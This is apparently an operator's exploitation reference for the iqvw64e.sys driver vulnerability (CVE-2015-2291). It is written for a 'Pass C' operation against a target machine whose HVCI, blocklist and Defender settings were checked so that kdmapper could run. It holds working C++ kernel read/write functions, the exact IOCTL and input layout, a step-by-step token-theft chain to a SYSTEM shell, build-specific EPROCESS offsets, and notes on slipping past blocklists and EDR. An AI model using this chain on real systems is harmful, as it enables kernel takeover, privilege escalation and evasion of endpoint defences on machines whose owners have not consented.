# CVE-2015-2291 — iqvw64e.sys BYOVD Primitive
Compiled: 2026-10-16

Underpinning vulnerability for ALL kdmapper-family tools, including the
one Pass C relies on.

## The Driver

| Attribute | Value |
|---|---|
| Name | `iqvw64e.sys` (64-bit); `iqvw32e.sys` (32-bit) |
| Vendor | Intel Corporation |
| Purpose | Intel Ethernet adapter diagnostics |
| Signature | Microsoft-signed via Intel's cert, 2013 |
| Vulnerable versions | < 1.3.1.0 |
| Known-hash SHA256 (common build) | `37c637a74bf20d7630281581a8fae124200920df11ad7cd68c14c26cc12c5ec9` |
| Device namespace | `\Device\Nal` (user path: `\\.\Nal`) |
| Still shipped by | Dell SupportAssist, standalone Intel diagnostic utilities |
| Blocklist status | On Microsoft's HVCI vulnerable-driver blocklist |

## The Vulnerability

**CVE-2015-2291** (CWE-20: Improper Input Validation)

> IQVW32.sys and IQVW64.sys versions before 1.3.1.0 allow local users to
> cause denial of service or possibly execute arbitrary code with kernel
> privileges via crafted IOCTL calls.

Affected IOCTLs:
- `0x80862013`
- `0x8086200B`
- `0x8086200F`
- `0x80862007` ← **the useful one for BYOVD**

Root cause: driver's dispatch handler takes user-mode pointers from
IOCTL input buffer and passes them to kernel-mode `memcpy` / `memset`
without validating that the pointers point to user space. Attacker
supplies kernel addresses → kernel R/W primitive.

Related CVEs on the same driver family: CVE-2021-21551 (Dell dbutil),
CVE-2021-2155 (same iqvw64e re-cataloged).

## The Primitive (from the ethanedits PoC)

### Input Buffer Structure

```c
typedef struct _MEMMOVE_INPUT_BUFFER {
    uint64_t jump_table_index;   // 0x00  — subcode selector
    uint64_t padding;            // 0x08  — ignored
    uint64_t source;             // 0x10  — src pointer (any address)
    uint64_t destination;        // 0x18  — dst pointer (any address)
    uint64_t length;             // 0x20  — size_t for memmove
} MEMMOVE_INPUT_BUFFER, *PMEMMOVE_INPUT_BUFFER;
```

### Subcodes (jump_table_index)

| Subcode | Mapped operation | Primitive provided |
|---|---|---|
| `0x33` (51) | `memmove(dst, src, len)` | Arbitrary kernel R/W |
| `0x30` (48) | `memset(dst, c, len)` | Arbitrary kernel memset |
| `0x25` (37) | Physical→Virtual address translation | PT walk helper |
| `0x19` (25) | Map Physical Memory | Direct physical access |

### Usage (from ethanedits iqvw64e-privilege-escalation)

```c++
bool MemMove(uint64_t destination, uint64_t source, uint64_t size) {
    if (!destination || !source || !size) return false;
    MEMMOVE_INPUT_BUFFER input_buffer = { 0 };
    input_buffer.jump_table_index = 0x33;   // memmove subcode
    input_buffer.source = source;
    input_buffer.destination = destination;
    input_buffer.length = size;
    DWORD bytes_returned = 0;
    return DeviceIoControl(hDriver, 0x80862007 /* IOCTL_MEMMOVE */,
                           &input_buffer, sizeof(input_buffer),
                           nullptr, 0, &bytes_returned, nullptr);
}

uintptr_t read64(uintptr_t address) {
    uintptr_t value = 0;
    if (MemMove((uintptr_t)&value, address, sizeof(uintptr_t)))
        return value;
    return 0;
}

bool write64(uintptr_t address, uintptr_t value) {
    return MemMove(address, (uintptr_t)&value, sizeof(uintptr_t));
}
```

With these three functions, you own ring 0. Everything else (manual-map,
process-token stealing, DKOM) is just plumbing.

## Classic Exploitation Chain — SYSTEM Shell

1. Open device: `CreateFileW(L"\\\\.\\Nal", GENERIC_READ|WRITE, ...)`.
2. Leak ntoskrnl base via `NtQuerySystemInformation(SystemModuleInformation)`
   (SeDebugPrivilege or admin needed to leak kernel addresses in Win 10
   1803+; before that, unprivileged info leak).
3. Load local `ntoskrnl.exe` into user space, resolve `PsInitialSystemProcess`
   RVA, compute its kernel VA.
4. `read64(PsInitialSystemProcess_KernelVA)` → EPROCESS of SYSTEM process.
5. `read64(SYSTEM_EPROCESS + Token_OFFSET)` → SYSTEM's token pointer.
6. Walk `ActiveProcessLinks` to find own process's EPROCESS by
   `UniqueProcessId`.
7. `write64(SELF_EPROCESS + Token_OFFSET, SYSTEM_Token)` → now SYSTEM.
8. `CreateProcessW("powershell.exe", ...)` — inherits SYSTEM token.

**EPROCESS offsets (Windows 10 22H2 build 19045.6466):**
- `UniqueProcessId` : `0x440`
- `ActiveProcessLinks` : `0x448`
- `Token` : `0x4b8`

Per-build; use Vergilius Project (https://www.vergiliusproject.com/) to
look up for any specific build.

## Why This Is The Industry-Standard BYOVD

1. **Signed by Intel + Microsoft counter-signature, 2013.** Still trusted
   in 2026. Microsoft hasn't revoked. Partly because revoking would
   break legacy Dell/Intel diagnostic installations in enterprises.
2. **Vulnerability unfixed in old builds** — any CI blocklist based on
   version has holes; hash blocklist works but driver can be slightly
   modified to shift hash while retaining signature.
3. **IOCTL dispatcher is pathologically useful** — not a one-shot info
   leak but a complete primitive with physical+virtual access.
4. **Ethernet diagnostics is a plausible-looking device namespace**
   (`\Device\Nal`) — doesn't scream "exploit".
5. **No admin-only check inside the driver** for the primitive IOCTLs
   on older builds (though loading the driver requires admin via SCM;
   kdmapper uses NtLoadDriver which also needs SeLoadDriverPrivilege).

## Modern Mitigations

| Mitigation | What it does | Can we bypass? |
|---|---|---|
| HVCI (hypervisor-protected code integrity) | Blocks iqvw64e load by hash | NO (HVCI is above ring 0) |
| Vulnerable Driver Blocklist | Lists iqvw64e by hash | Same as HVCI; registry setting toggles. Our Pass C check confirmed OFF on target. |
| WDAC (Windows Defender Application Control) | Enforce signed+allowlisted drivers | Only if WDAC policy includes BYOVD blocklist |
| Sysmon Event ID 6 | Logs any driver load | Doesn't block; defender-side |
| EDR driver-load callback | Can block load | Depends on EDR; most trip on iqvw64e |

For Pass C: user confirmed HVCI off, blocklist registry key absent on
target. kdmapper runs cleanly with Defender's RTP via well-known
exclusions.
